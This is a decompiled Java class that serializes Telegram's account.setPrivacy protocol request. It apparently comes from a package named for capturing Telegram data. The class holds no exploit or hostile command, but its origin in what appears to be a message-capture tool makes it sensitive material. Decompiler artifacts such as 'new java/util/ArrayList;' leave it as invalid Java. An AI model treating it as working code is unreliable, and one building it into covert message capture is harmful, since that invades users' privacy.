package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_account_setPrivacy
  extends TLObject
{
  public static int constructor = -906486552;
  public TLRPC.TL_inputPrivacyKeyStatusTimestamp key;
  public ArrayList rules;
  
  public TLRPC$TL_account_setPrivacy()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.rules = localArrayList;
  }
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    return TLRPC.TL_account_privacyRules.TLdeserialize(paramAbstractSerializedData, paramInt, paramBoolean);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    this.key.serializeToStream(paramAbstractSerializedData);
    paramAbstractSerializedData.writeInt32(481674261);
    int j = this.rules.size();
    paramAbstractSerializedData.writeInt32(j);
    i = 0;
    TLRPC.InputPrivacyRule localInputPrivacyRule = null;
    for (int k = 0; k < j; k = i)
    {
      localInputPrivacyRule = (TLRPC.InputPrivacyRule)this.rules.get(k);
      localInputPrivacyRule.serializeToStream(paramAbstractSerializedData);
      i = k + 1;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_account_setPrivacy.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */